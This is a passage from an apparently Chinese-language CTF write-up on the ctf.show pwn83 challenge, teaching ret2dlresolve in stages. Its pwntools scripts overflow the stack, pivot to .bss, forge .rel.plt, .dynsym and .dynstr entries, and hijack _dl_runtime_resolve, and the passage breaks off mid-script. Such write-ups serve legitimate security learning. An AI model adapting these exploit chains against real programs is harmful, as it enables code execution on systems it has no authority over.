<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28296&quot;)</span><br><span class="line">rop = ROP(&quot;../pwn83&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn83&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x6c + 0x4</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line"># 确定栈的大小为0x800</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"># 填充缓冲区和ebp</span><br><span class="line">rop.raw(cyclic(offset))</span><br><span class="line"># 调用read函数填充base_stage的区域，字节数为100</span><br><span class="line">rop.read(0,base_stage,100)</span><br><span class="line"># 栈迁移到base_stage</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">p.recvuntil(&quot;Welcome to CTFshowPWN!\n&quot;)</span><br><span class="line">p.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">print(rop.dump())</span><br><span class="line"></span><br><span class="line"># 发送填充到base_stage的内容</span><br><span class="line">rop = ROP(&quot;../pwn83&quot;)</span><br><span class="line">sh = &quot;/bin/sh&quot;</span><br><span class="line"># 先写入write函数，写在base_stage处，由于write中输出的变量地址为base_stage+80，所以需要将sh写在base_stage+80的位置，然后补全到100估计是强迫症吧，显得美观一点</span><br><span class="line">rop.write(1, base_stage + 80, len(sh))</span><br><span class="line">rop.raw(&#x27;a&#x27; * (80 - len(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(&#x27;a&#x27; * (100 - len(rop.chain())))</span><br><span class="line">p.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">print(rop.dump())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h5 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a>stage2</h5><p>使用栈迁移将栈迁移到bss段</p>
<p>控制程序直接通过plt表来执行write函数</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240830100549325.png" alt="image-20240830100549325"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240830104837955.png" alt="image-20240830104837955"></p>
<p>.plt的首地址是0x08048370</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240830105031359.png" alt="image-20240830105031359"></p>
<p>write_reloc_offset是根据write函数和.rel.plt首地址的间隔计算出来的</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240830113659060.png" alt="image-20240830113659060"></p>
<p>plt地址的调用其实就是push了_dl_runtime_resolve的第一个参数link_map_obj，然后由于堆栈空间的分布，计算出来的write_reloc_offset作为_dl_runtime_resolve的第二个参数，以此完成对_dl_runtime_resolve的调用。根据ret指令的原理，eip &#x3D; esp + 4，所以当执行push指令时，esp先会减4，指向下一个地址，然后再将参数填入堆栈，减4之后的esp指向的是’bbbb’的位置，也就是事先准备好的占位符。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">#p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28296&quot;)</span><br><span class="line">p = process(&quot;../pwn83&quot;)</span><br><span class="line">rop = ROP(&quot;../pwn83&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn83&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x6c + 0x4</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line"># 确定栈的大小为0x800</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"># 填充缓冲区和ebp</span><br><span class="line">rop.raw(cyclic(offset))</span><br><span class="line"># 调用read函数填充base_stage的区域，字节数为100</span><br><span class="line">rop.read(0,base_stage,100)</span><br><span class="line"># 栈迁移到base_stage</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">p.recvuntil(&quot;Welcome to CTFshowPWN!\n&quot;)</span><br><span class="line">p.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">print(rop.dump())</span><br><span class="line"></span><br><span class="line"># 发送填充到base_stage的内容</span><br><span class="line">rop = ROP(&quot;../pwn83&quot;)</span><br><span class="line"># 获得plt的首地址</span><br><span class="line">plt_addr = elf.get_section_by_name(&quot;.plt&quot;).header.sh_addr</span><br><span class="line">print(plt_addr)</span><br><span class="line"># 获取.rel.plt的内容</span><br><span class="line">rel_plt_data = elf.get_section_by_name(&quot;.rel.plt&quot;).data()</span><br><span class="line">write_got_addr = elf.got[&quot;write&quot;]</span><br><span class="line"># 获取在.rel.plt中write_got_addr的偏移</span><br><span class="line">write_reloc_offset = rel_plt_data.find(p32(write_got_addr,endian=&quot;little&quot;))</span><br><span class="line">print(write_reloc_offset)</span><br><span class="line"># 定义sh</span><br><span class="line">sh = &#x27;/bin/sh&#x27;</span><br><span class="line"></span><br><span class="line"># 调用_dl_runtime_resolve，完成对write函数的调用</span><br><span class="line">rop.raw(plt_addr)</span><br><span class="line">rop.raw(write_reloc_offset)</span><br><span class="line">rop.raw(&#x27;bbbb&#x27;)</span><br><span class="line"># write的参数</span><br><span class="line">rop.raw(1)</span><br><span class="line">rop.raw(base_stage + 80)</span><br><span class="line">rop.raw(len(sh))</span><br><span class="line">rop.raw(&#x27;a&#x27; * (80 - len(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(&#x27;a&#x27; * (100 - len(rop.chain())))</span><br><span class="line">p.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">print(rop.dump())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h5 id="dl-runtime-resolve知识补充2"><a href="#dl-runtime-resolve知识补充2" class="headerlink" title="_dl_runtime_resolve知识补充2"></a>_dl_runtime_resolve知识补充2</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">`_dl_runtime_resolve` 函数不仅仅是一个链接功能，它实际上负责处理动态链接库（shared libraries）中的延迟绑定（lazy binding），并最终调用目标函数。因此，它的作用不仅是解析符号地址，还会执行实际的函数调用。</span><br><span class="line"></span><br><span class="line">`_dl_runtime_resolve` 的工作流程大致如下：</span><br><span class="line"></span><br><span class="line">1. 接收参数：`_dl_runtime_resolve` 函数通常接收两个参数：一个是指向动态链接映射结构（`struct link_map *`）的指针，另一个是重定位表项（`reloc_arg`），这个参数是用于找到要解析的符号的。</span><br><span class="line"></span><br><span class="line">2. 查找重定位表项：通过 `reloc_arg` 找到重定位表项，这个表项包含了需要解析的函数符号信息。</span><br><span class="line"></span><br><span class="line">3. 查找符号地址：根据符号信息查找目标函数在共享库中的实际地址，这个过程涉及解析 `.dynsym` 和 `.dynstr` 段中的数据。</span><br><span class="line"></span><br><span class="line">4. 更新 GOT 表：一旦目标函数的地址被解析出来，它会被写入到对应的 GOT 表项中。这意味着下次再调用同一个函数时，不需要再次经过 `_dl_runtime_resolve`，而是直接从 GOT 表中取出地址并调用。</span><br><span class="line"></span><br><span class="line">5. 跳转并执行目标函数：一旦地址解析完成，`_dl_runtime_resolve` 会通过跳转指令将程序流跳转到目标函数的实际地址并执行它。</span><br><span class="line"></span><br><span class="line">总结：</span><br><span class="line">`_dl_runtime_resolve` 不仅执行了符号解析，还会负责调用目标函数。所以它不只是一个简单的链接功能，而是动态链接过程中实现延迟绑定的关键部分，最终确保程序能够正确调用共享库中的函数。</span><br></pre></td></tr></table></figure>

<h5 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h5><p>栈迁移不必多说，这次需要控制的是_dl_runtime_resolve的第二个参数，也就是reloc_index，使其指向我们伪造的write条目，但是仍然能够正常执行</p>
<p>在此之前可以先看一下真正的write条目长什么样</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240830134131071.png" alt="image-20240830134131071"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240830134200706.png" alt="image-20240830134200706"></p>
<p>就是R_386_JMP_SLOT write对应的那个条目，第一个地址0x804a01c指向的是.got.plt中的write地址，第二个00000607中的06指的是在.dynsym中的索引，07指的是重定向类型（这个好像不太重要，我就没有再搜了)</p>
<p>跟stage最大的不同在于需要自己对.rel.plt的内容进行伪造，还需要对reloc_index这个参数进行计算</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">#p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28296&quot;)</span><br><span class="line">p = process(&quot;../pwn83&quot;)</span><br><span class="line">rop = ROP(&quot;../pwn83&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn83&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x6c + 0x4</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line"># 确定栈的大小为0x800</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"># 填充缓冲区和ebp</span><br><span class="line">rop.raw(cyclic(offset))</span><br><span class="line"># 调用read函数填充base_stage的区域，字节数为100</span><br><span class="line">rop.read(0,base_stage,100)</span><br><span class="line"># 栈迁移到base_stage</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">p.recvuntil(&quot;Welcome to CTFshowPWN!\n&quot;)</span><br><span class="line">p.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">print(rop.dump())</span><br><span class="line"></span><br><span class="line"># 发送填充到base_stage的内容</span><br><span class="line">rop = ROP(&quot;../pwn83&quot;)</span><br><span class="line"># 获得plt的首地址</span><br><span class="line">plt_addr = elf.get_section_by_name(&quot;.plt&quot;).header.sh_addr</span><br><span class="line">print(plt_addr)</span><br><span class="line"># 获取.rel.plt的位置</span><br><span class="line">rel_plt_addr = elf.get_section_by_name(&quot;.rel.plt&quot;).header.sh_addr</span><br><span class="line"># 获取got中write的地址</span><br><span class="line">write_got_addr = elf.got[&quot;write&quot;]</span><br><span class="line"># 定义sh</span><br><span class="line">sh = &#x27;/bin/sh&#x27;</span><br><span class="line"># 定义fake_write_rel_plt的位置为base_stage + 24，计算fake_write_reloc_offset</span><br><span class="line">fake_write_reloc_offset = base_stage + 24 - rel_plt_addr</span><br><span class="line"># 定义r_info(由图可得)</span><br><span class="line">r_info = 0x607</span><br><span class="line"></span><br><span class="line"># 调用_dl_runtime_resolve，完成对write函数的调用</span><br><span class="line">rop.raw(plt_addr)</span><br><span class="line">rop.raw(fake_write_reloc_offset)</span><br><span class="line">rop.raw(&#x27;bbbb&#x27;)</span><br><span class="line"># write的参数</span><br><span class="line">rop.raw(1)</span><br><span class="line">rop.raw(base_stage + 80)</span><br><span class="line">rop.raw(len(sh))</span><br><span class="line"># 6*4Byte，刚好是24</span><br><span class="line">rop.raw(write_got_addr)</span><br><span class="line">rop.raw(r_info)</span><br><span class="line">rop.raw(&#x27;a&#x27; * (80 - len(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(&#x27;a&#x27; * (100 - len(rop.chain())))</span><br><span class="line">p.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">print(rop.dump())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h5 id="stage4"><a href="#stage4" class="headerlink" title="stage4"></a>stage4</h5><p>这次不仅需要对.rel.plt进行伪造，还需要对.dynsym进行伪造，首先回忆一下_dl_runtime_resolve，通过.rel.plt -&gt; .dynsym -&gt; .dynstr的链条进行解析，此处我们对.dynsym的位置进行了改动，所以.rel.plt中指向.dynsym的r_info也需要进行修改，由于.rel.plt也是伪造的，所以_dl_runtime_resolve的参数reloc_offset也需要进行修改。</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240830151046095.png" alt="image-20240830151046095"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240830151350358.png" alt="image-20240830151350358"></p>
<p>这就是.dynsym的内容，0x0804822c处是write条目的相关信息，这些内容是不用改的，需要改的主要是伪造出来的地址。ELF 符号表 (.dynsym) 中的每个符号表项的大小是 0x10字节。因此，为了使伪造的符号表项能够正确地与 .dynsym中的其他表项对齐，必须确保伪造符号表项的地址与 0x10对齐。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">#p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28296&quot;)</span><br><span class="line">p = process(&quot;../pwn83&quot;)</span><br><span class="line">rop = ROP(&quot;../pwn83&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn83&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x6c + 0x4</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line"># 确定栈的大小为0x800</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size + (0x080487C2-0x080487A8)//2*0x10</span><br><span class="line"># 填充缓冲区和ebp</span><br><span class="line">rop.raw(cyclic(offset))</span><br><span class="line"># 调用read函数填充base_stage的区域，字节数为100</span><br><span class="line">rop.read(0,base_stage,100)</span><br><span class="line"># 栈迁移到base_stage</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">p.recvuntil(&quot;Welcome to CTFshowPWN!\n&quot;)</span><br><span class="line">p.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">print(rop.dump())</span><br><span class="line"></span><br><span class="line"># 发送填充到base_stage的内容</span><br><span class="line">rop = ROP(&quot;../pwn83&quot;)</span><br><span class="line"># 获得plt的首地址</span><br><span class="line">plt_addr = elf.get_section_by_name(&quot;.plt&quot;).header.sh_addr</span><br><span class="line"># 获取.rel.plt的位置</span><br><span class="line">rel_plt_addr = elf.get_section_by_name(&quot;.rel.plt&quot;).header.sh_addr</span><br><span class="line"># 获取.dynsym的位置</span><br><span class="line">dynsym_addr = elf.get_section_by_name(&quot;.dynsym&quot;).header.sh_addr</span><br><span class="line"># 获取got中write的地址</span><br><span class="line">write_got_addr = elf.got[&quot;write&quot;]</span><br><span class="line"># 定义sh</span><br><span class="line">sh = &#x27;/bin/sh&#x27;</span><br><span class="line"></span><br><span class="line"># 定义fake_dynsym的位置为base_stage + 32</span><br><span class="line">fake_dynsym_addr = base_stage + 32</span><br><span class="line"></span><br><span class="line"># 将fake_dynsym和dynsym的地址进行对齐，就比如说原来的dynsym的地址是0x080481cc，以c结尾，那么fake_dynsym的地址也应该以c结尾，而base_stage + 32不一定是c结尾的，所以需要对fake_dynsym进行对齐</span><br><span class="line">align = 0x10 - ((fake_dynsym_addr - dynsym_addr)) &amp; 0xf</span><br><span class="line">fake_dynsym_addr = fake_dynsym_addr + align</span><br><span class="line"></span><br><span class="line"># 计算fake_dynsym在真正的dynsym中的索引，其实此处就是假设fake_dynsym是.dynsym的延伸，因此可以通过索引来指向fake_dynsym</span><br><span class="line">dynsym_index = (fake_dynsym_addr - dynsym_addr) // 0x10 </span><br><span class="line"></span><br><span class="line"># 这个是直接从.dynsym里面复制过来的，不需要修改</span><br><span class="line">fake_dynsym_write = flat([0x4c,0,0,0x12])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 定义fake_write_rel_plt的位置为base_stage + 24，计算fake_write_reloc_offset</span><br><span class="line">fake_write_reloc_offset = base_stage + 24 - rel_plt_addr</span><br><span class="line"># 定义r_info(根据r_info和dynsym之间的关系可以得到)</span><br><span class="line">r_info = (dynsym_index &lt;&lt; 8) | 0x7</span><br><span class="line"></span><br><span class="line"># 调用_dl_runtime_resolve，完成对write函数的调用</span><br><span class="line">rop.raw(plt_addr)</span><br><span class="line">rop.raw(fake_write_reloc_offset)</span><br><span class="line">rop.raw(&#x27;bbbb&#x27;)</span><br><span class="line"># write的参数</span><br><span class="line">rop.raw(1)</span><br><span class="line">rop.raw(base_stage + 80)</span><br><span class="line">rop.raw(len(sh))</span><br><span class="line"># 6*4Byte，刚好是24</span><br><span class="line">rop.raw(write_got_addr)</span><br><span class="line">rop.raw(r_info)</span><br><span class="line">rop.raw(&#x27;a&#x27; * align)</span><br><span class="line">rop.raw(fake_dynsym_write)</span><br><span class="line">rop.raw(&#x27;a&#x27; * (80 - len(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(&#x27;a&#x27; * (100 - len(rop.chain())))</span><br><span class="line">p.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">print(rop.dump())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当然这段代码执行完是会崩掉的，原因在ctfwiki中有说，虽然我调不出来。</p>
<p>后面的看不懂，大概意思就是为了满足某个参数的要求，需要将栈调整到特定的位置，然后才可以执行成功，反正我照着copy也成功了，确实是这样的（pwn，真神奇吧）（实在不想照抄的可以按每次十个字节爆破一下，先知道答案写进字典里再爆破得到答案怎么不算爆破呢）</p>
<h5 id="stage5"><a href="#stage5" class="headerlink" title="stage5"></a>stage5</h5><p>通过伪造.dynsym中的dt_name来实现对write的调用，由于伪造了dt_name，所以实际上指向的内容就是可以由我们控制的。</p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240830222035748.png" alt="image-20240830222035748"></p>
<p><img src="/2024/09/03/pwn35-90%E6%A0%88%E6%BA%A2%E5%87%BA/image-20240830222051214.png" alt="image-20240830222051214"></p>
<p>.dynsym中的dt_name指向的是.dynstr的偏移</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">#p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28296&quot;)</span><br><span class="line">p = process(&quot;../pwn83&quot;)</span><br><span class="line">rop = ROP(&quot;../pwn83&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn83&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x6c + 0x4</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line"># 确定栈的大小为0x800</span><br><span class="line">stack_size = 0x800</span><br><span class="line">base_stage = bss_addr + stack_size + (0x080487C2-0x080487A8)//2*0x10</span><br><span class="line"># 填充缓冲区和ebp</span><br><span class="line">rop.raw(cyclic(offset))</span><br><span class="line"># 调用read函数填充base_stage的区域，字节数为100</span><br><span class="line">rop.read(0,base_stage,100)</span><br><span class="line"># 栈迁移到base_stage</span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">p.recvuntil(&quot;Welcome to CTFshowPWN!\n&quot;)</span><br><span class="line">p.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line">print(rop.dump())</span><br><span class="line"></span><br><span class="line"># 发送填充到base_stage的内容</span><br><span class="line">rop = ROP(&quot;../pwn83&quot;)</span><br><span class="line"># 获得plt的首地址</span><br><span class="line">plt_addr = elf.get_section_by_name(&quot;.plt&quot;).header.sh_addr</span><br><span class="line"># 获取.rel.plt的位置</span><br><span class="line">rel_plt_addr = elf.get_section_by_name(&quot;.rel.plt&quot;).header.sh_addr</span><br><span class="line"># 获取.dynsym的位置</span><br><span class="line">dynsym_addr = elf.get_section_by_name(&quot;.dynsym&quot;).header.sh_addr</span><br><span class="line"># 获取.dynstr的位置</span><br><span class="line">dynstr_addr = elf.get_section_by_name(&quot;.dynstr&quot;).header.sh_addr</span><br><span class="line"># 获取got中write的地址</span><br><span class="line">write_got_addr = elf.got[&quot;write&quot;]</span><br><span class="line"># 定义sh</span><br><span class="line">sh = &#x27;/bin/sh&#x27;</span><br><span class="line"></span><br><span class="line"># 定义fake_dynsym的位置为base_stage + 32</span><br><span class="line">fake_dynsym_addr = base_stage + 32</span><br><span class="line"></span><br><span class="line"># 将fake_dynsym和dynsym的地址进行对齐，就比如说原来的dynsym的地址是0x080481cc，以c结尾，那么fake_dynsym的地址也应该以c结尾，而base_stage + 32不一定是c结尾的，所以需要对fake_dynsym进行对齐</span><br><span class="line">align = 0x10 - ((fake_dynsym_addr - dynsym_addr)) &amp; 0xf</span><br><span class="line">fake_dynsym_addr = fake_dynsym_addr + align</span><br><span class="line"></span><br><span class="line"># 计算fake_dynsym在真正的dynsym中的索引，其实此处就是假设fake_dynsym是.dynsym的延伸，因此可以通过索引来指向fake_dynsym</span><br><span class="line">dynsym_index = (fake_dynsym_addr - dynsym_addr) // 0x10 </span><br><span class="line"></span><br><span class="line">#定义fake_dynstr的地址为fake_dynsym+0x10的位置</span><br><span class="line">fake_dynstr_addr = fake_dynsym_addr + 0x10</span><br><span class="line"></span><br><span class="line"># 计算st_name</span><br><span class="line">fake_st_name = fake_dynstr_addr - dynstr_addr</span><br><span class="line"></span><br><span class="line"># 这个是直接从.dynsym里面复制过来的，不需要修改</span><br><span class="line">fake_dynsym_write = flat([fake_st_name,0,0,0x12])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 定义fake_write_rel_plt的位置为base_stage + 24，计算fake_write_reloc_offset</span><br><span class="line">fake_write_reloc_offset = base_stage + 24 - rel_plt_addr</span><br><span class="line"># 定义r_info(根据r_info和dynsym之间的关系可以得到)</span><br><span class="line">r_info = (dynsym_index &lt;&lt; 8) | 0x7</span><br><span class="line"> </span><br><span class="line"># 调用_dl_runtime_resolve，完成对write函数的调用</span><br><span class="line">rop.raw(plt_addr)</span><br><span class="line">rop.raw(fake_write_reloc_offset)</span><br><span class="line">rop.raw(&#x27;bbbb&#x27;)</span><br><span class="line"># write的参数</span><br><span class="line">rop.raw(1)</span><br><span class="line">rop.raw(base_stage + 80)</span><br><span class="line">rop.raw(len(sh))</span><br><span class="line"># 